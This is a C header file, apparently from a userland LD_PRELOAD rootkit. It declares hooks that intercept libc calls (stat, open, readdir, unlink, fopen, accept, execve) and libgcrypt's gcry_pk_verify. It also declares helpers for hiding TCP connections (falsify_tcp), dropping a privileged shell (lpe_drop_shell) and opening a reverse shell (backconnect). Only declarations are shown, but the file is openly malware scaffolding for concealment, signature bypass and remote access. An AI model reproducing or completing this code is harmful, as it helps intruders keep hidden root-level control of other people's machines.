#ifndef FATHER_H
#define FATHER_H
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <signal.h>
#include <time.h>
#include <pwd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <gcrypt.h>
#include <string.h>
#include <stdlib.h>
#include <stdarg.h>
#include <errno.h>
#include "config.h"

// function pointers
int (*o_lxstat)(int, const char *, struct stat *);
int (*o_lxstat64)(int, const char *, struct stat64 *);
int (*o_lstat)(const char *, struct stat *);
int (*o_fstat)(int, struct stat *);
int (*o_access)(const char *, int mode);
int (*o_open)(const char *, int, mode_t);
int (*o_open64)(const char *, int, mode_t);
int (*o_openat)(int, const char *, int);
int (*o_accept)(int, struct sockaddr *, socklen_t *);
struct dirent * (*o_readdir)(DIR *);
int (*o_unlink)(const char *);
int (*o_unlinkat)(int, const char *, int);
int (*o_getsockname)(int, struct sockaddr *, socklen_t *);
FILE * (*o_fopen)(const char *, const char *);
FILE * (*o_fopen64)(const char *, const char *);
DIR * (*o_opendir)(const char *);
int (*o_execve)(const char *, char *const argv[], char *const envp[]);
gcry_error_t (*o_verify)(gcry_sexp_t, gcry_sexp_t, gcry_sexp_t);

// functions hooks (interceptions)
int __lxstat(int version, const char *path, struct stat *buf);
int __lxstat64(int version, const char *path, struct stat64 *buf);
int lstat(const char * path, struct stat * buf);
int fstat(int filedes, struct stat *buf);
int access(const char * pathname, int mode);
int open(const char *pathname, int flags, mode_t mode);
int open64(const char *pathname, int flags, mode_t mode);
int openat(int dirfd, const char * pathname, int flags);
struct dirent * readdir(DIR *p);
int unlink(const char *pathname);
int unlinkat(int dirfd, const char * pathname, int flags);
int getsockname(int socket, struct sockaddr * addr, socklen_t * addrlen);
FILE * fopen(const char * pathname, const char *mode);
FILE * fopen64(const char * pathname, const char * mode);
int accept(int sockfd, struct sockaddr * addr, socklen_t * addrlen);
DIR * opendir(const char *name);
int execve(const char *path, char *const argv[], char *const envp[]);
gcry_error_t gcry_pk_verify(gcry_sexp_t sig, gcry_sexp_t data, gcry_sexp_t pkey);

// utility functions
FILE * falsify_tcp(const char * pathname, const char * mode, FILE * (*old_fopen)(const char *, const char *));
void lpe_drop_shell();
void backconnect(char * ip, int port);

#endif
